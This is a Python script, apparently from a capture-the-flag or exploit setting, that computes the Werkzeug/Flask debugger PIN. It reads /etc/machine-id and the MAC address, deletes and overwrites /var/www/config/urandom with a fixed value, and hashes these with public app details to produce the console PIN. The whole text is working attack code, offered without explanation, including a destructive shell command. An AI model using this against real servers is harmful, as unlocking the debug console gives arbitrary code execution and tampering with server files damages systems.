import hashlib
from itertools import chain
import uuid
import os

os.system('rm /var/www/config/urandom')

with open('/var/www/config/urandom', 'wb') as f:
    f.write(b'1111111111111111')

def get_machine_id():
    linux = b''
    with open('/etc/machine-id', 'rb') as f:
        value = f.readline().strip()
    if value:
        linux += value
    return linux.decode()

probably_public_bits = [
    'flaskdev',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.10/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    str(uuid.getnode()), #'2482665399042', /sys/class/net/ens33/address
    get_machine_id(), #'68f432c96a6d45f585a019af1ad31fc2', /etc/machine-id
    b'1111111111111111'
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)